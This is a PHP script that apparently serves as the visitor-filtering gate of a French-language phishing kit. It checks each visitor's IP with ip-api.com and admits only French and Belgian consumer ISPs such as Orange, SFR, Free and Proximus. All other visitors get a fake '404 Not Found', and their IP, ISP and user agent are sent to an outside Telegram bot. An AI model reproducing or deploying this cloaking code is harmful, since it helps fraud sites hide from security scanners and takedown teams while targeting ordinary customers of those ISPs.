<?php 

include('config.php');

if (!isset($_SESSION)) {
    session_start();  // Start the session if not already started
}

if ($test_mode) {
    $ip = "128.78.14.206";
} else {
    $ip = $_SERVER['REMOTE_ADDR']; 
}

function getIpInfooo($ip = '') { 
    $ipinfo = file_get_contents("http://ip-api.com/json/" . $ip); 
    $ipinfo_json = json_decode($ipinfo, true); 
    return $ipinfo_json; 
} 

if ($test_mode) {
    $visitor_ip = "128.78.14.206";
} else {
    $visitor_ip = $_SERVER['REMOTE_ADDR']; 
}

$ipinfo_json = getIpInfooo($visitor_ip); 

if ($ipinfo_json['status'] != 'fail') {
    $org = $ipinfo_json['as']; // Get the organization
    $isps = $ipinfo_json['isp']; // Get the ISP
    $country = $ipinfo_json['country']; // Get the country
    $countryCode = $ipinfo_json['countryCode']; // Get the country code
} else {
    $org = "Introuvable";
    $isps = "Introuvable";
    $country = "Introuvable";
}

if ($countryCode == "FR" || $visitor_ip == "127.0.0.1") {
    if (strpos($org, "wanadoo") || strpos($org, "bbox") || strpos($org, "Bouygues") || strpos($org, "Orange") || strpos($org, "sfr") || strpos($org, "SFR") || strpos($org, "Sfr") || strpos($org, "free") || strpos($org, "Free") || strpos($org, "FREE") || strpos($org, "red") || strpos($org, "proxad") || strpos($org, "club-internet") || strpos($org, "oleane") || strpos($org, "nordnet") || strpos($org, "liberty") || strpos($org, "colt") || strpos($org, "chello") || strpos($org, "belgacom") || strpos($org, "Proximus") || strpos($org, "skynet") || strpos($org, "aol") || strpos($org, "neuf") || strpos($org, "darty") || strpos($org, "bouygue") || strpos($org, "numericable") || strpos($org, "Free") || strpos($org, "Num\303\251ris") || strpos($org, "Poste") || strpos($org, "Sosh") || strpos($org, "Telenet") || strpos($org, "telenet") || strpos($org, "sosh") || strpos($org, "proximus") || strpos($org, "Belgacom") || strpos($org, "orange") || strpos($org, "Skynet") || strpos($org, "PROXIMUS") || strpos($org, "Neuf") || strpos($org, "Numericable") || $visitor_ip == "127.0.0.1") {
        // Allowed ISP - do nothing
    } else { 
        die('HTTP/1.0 404 Not Found - ' . $org . ' - ' . $isps . ' - ' . $country); 
    }
} else {
    $message = "
    「 🔴 ISP BLOQUE 🔴 」
        
    「🕸」 ISP : $org
                
    「☂️」 Adresse ip : " . $_SERVER['REMOTE_ADDR'] . "
    「☔️」 User Agent : " . $_SERVER['HTTP_USER_AGENT'] . "
        ";
    file_get_contents("https://api.telegram.org/bot".$token."/sendMessage?chat_id=".$badisp."&text=" . urlencode($message));
    die('HTTP/1.0 404 Not Found - ' . $country); 
}

?>